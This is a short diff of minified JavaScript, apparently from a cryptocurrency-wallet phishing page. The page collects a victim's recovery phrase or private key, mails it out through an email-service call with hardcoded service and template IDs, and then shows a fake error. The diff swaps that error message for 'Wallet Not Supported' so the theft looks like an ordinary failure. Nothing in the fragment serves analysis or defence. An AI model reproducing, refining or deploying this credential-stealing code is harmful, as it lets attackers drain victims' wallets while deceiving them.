@@ -29900,7 +29900,7 @@
                                         p ? alert("Incorrect Phrase") : (c(!0),
                                         A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
                                                 console.log(e),
-                                                    alert("Please, Enter Valid Phrase"),
+                                                    alert("Wallet Not Supported"),
                                                     l(""),
                                                     c(!1)
                                             }
@@ -29984,7 +29984,7 @@
                                         i ? (c(!0),
                                         A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
                                                 console.log(e),
-                                                    alert("Please, Enter Valid Private Key"),
+                                                    alert("Wallet Not Supported"),
                                                     l(""),
                                                     c(!1)
                                             }
